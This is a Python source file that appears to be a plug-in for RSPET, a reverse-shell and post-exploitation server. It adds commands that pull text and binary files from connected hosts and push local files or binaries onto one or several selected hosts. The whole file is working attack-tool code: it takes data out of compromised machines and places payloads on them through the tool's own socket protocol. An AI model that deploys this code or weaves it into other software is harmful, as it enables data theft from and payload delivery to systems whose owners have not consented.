"""
Plug-in module for RSPET server. Offer remote file inclusion functions.
"""
from __future__ import print_function
from socket import error as sock_error
from Plugins.mount import Plugin


class Files(Plugin):
    """
    Class expanding Plugin.
    """
    __server_commands__ = {}
    __cmd_help__ = {}

    def __init__(self):
        """
        Declare plugin's CLI commands their syntax and their scope.
        """
        self.__server_commands__["Pull_File"] = [self.pull_file, "connected"]
        self.__cmd_help__["Pull_File"] = "Pull_File <remote_file> [local_file]"
        self.__server_commands__["Pull_Binary"] = [self.pull_binary, "connected"]
        self.__cmd_help__["Pull_Binary"] = "Pull_Binary <remote_bin> [local_bin]"
        self.__server_commands__["Make_File"] = [self.make_file, "connected",
                                               "multiple"]
        self.__cmd_help__["Make_File"] = "Make_File <local_file> [remote_file]"
        self.__server_commands__["Make_Binary"] = [self.make_binary, "connected",
                                                 "multiple"]
        self.__cmd_help__["Make_Binary"] = "Make_Binary <local_bin> [remote_bin]"

    def pull_file(self, server, args):
        """Pull a regular text file from the host."""
        host = server.get_selected()[0]
        state = None
        if len(args) == 0:
            print("Usage: Pull_File <remote_file> [local_file]")
        else:
            remote_file = args[0]
            try:
                local_file = args[1]
            except IndexError:
                local_file = remote_file
            try:
                host.send(host.command_dict['sendFile'])
                host.send("%03d" % len(remote_file))
                host.send(remote_file)
            except sock_error:
                state = "basic"
            else:
                try:
                    if host.recv(3) == "fna": # recv can raise sock_error
                        print("File does not exist or Access Denied")
                    else:
                        try:
                            with open(local_file, "w") as file_obj:
                                filesize = int(host.recv(13))
                                file_obj.write(host.recv(filesize))
                        except IOError:
                            print("Cannot create local file")
                except sock_error:
                    pass
        return state

    def pull_binary(self, server, args):
        """Pull a binary file from the host(s)."""
        host = server.get_selected()[0]
        state = None
        if len(args) == 0:
            print("Usage: Pull_Binary <remote_file> [local_file]")
        else:
            remote_file = args[0]
            try:
                local_file = args[1]
            except IndexError:
                local_file = remote_file
            try:
                host.send(host.command_dict['sendBinary'])
                host.send("%03d" % len(remote_file))
                host.send(remote_file)
            except sock_error:
                state = "basic"
            else:
                try:
                    if host.recv(3) == "fna": # recv can raise sock_error
                        print("File does not exist or Access Denied")
                    else:
                        try:
                            with open(local_file, "wb") as file_obj:
                                filesize = int(host.recv(13))
                                file_obj.write(host.recv(filesize))
                        except IOError:
                            print("Cannot create local file")
                except sock_error:
                    state = "basic"
        return state

    def make_file(self, server, args):
        """Send a regular text file to the host(s)"""
        hosts = server.get_selected()
        state = None
        if len(args) == 0:
            print("Usage: Make_File <local_file> [remote_file]")
        else:
            local_file = args[0]
            try:
                remote_file = args[1]
            except IndexError:
                remote_file = local_file
            for host in hosts:
                try:
                    host.send(host.command_dict['getFile'])
                    host.send("%03d" % len(remote_file))
                    host.send(remote_file)
                except sock_error:
                    state = "basic"
                else:
                    try:
                        if host.recv(3) == "fna":
                            print("Access Denied")
                        else:
                            with open(local_file) as file_obj:
                                contents = file_obj.read()
                                host.send("%013d" % len(contents))
                                host.send(contents)
                                host.recv(3) #For future use?
                    except sock_error:
                        state = "basic"
        return state

    def make_binary(self, server, args):
        """Send a binary file to the host(s)"""
        hosts = server.get_selected()
        state = None
        if len(args) == 0:
            print("Usage: Make_Binary <local_file> [remote_file]")
        else:
            local_file = args[0]
            try:
                remote_file = args[1]
            except IndexError:
                remote_file = local_file
            for host in hosts:
                try:
                    host.send(host.command_dict['getBinary'])
                    host.send("%03d" % len(remote_file))
                    host.send(remote_file)
                except sock_error:
                    state = "basic"
                else:
                    try:
                        if host.recv(3) == "fna":
                            print("Access Denied")
                        else:
                            with open(local_file, "rb") as file_obj:
                                contents = file_obj.read()
                                host.send("%013d" % len(contents))
                                host.send(contents)
                                host.recv(3) # For future use?
                    except sock_error:
                        state = "basic"
        return state
